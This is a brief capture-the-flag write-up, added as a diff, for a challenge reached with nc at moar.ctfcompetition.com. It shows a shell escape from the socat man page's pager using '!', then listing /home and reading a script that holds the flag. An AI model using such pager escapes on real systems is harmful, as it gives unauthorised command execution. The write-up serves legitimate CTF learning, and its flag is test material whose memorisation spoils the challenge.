@@ -1,0 +1,17 @@
+After
+nc moar.ctfcompetition.com 1337
+we enter man page of socat
+
+In man, we can excute command with !
+
+We find key in home
+!ls /home
+!ls /home/moar
+
+We see suspicious file
+disable_dmz.sh
+
+Open that file, key it is
+!less /home/moar/disable_dmz.sh
+
+CTF{SOmething-CATastr0phic}
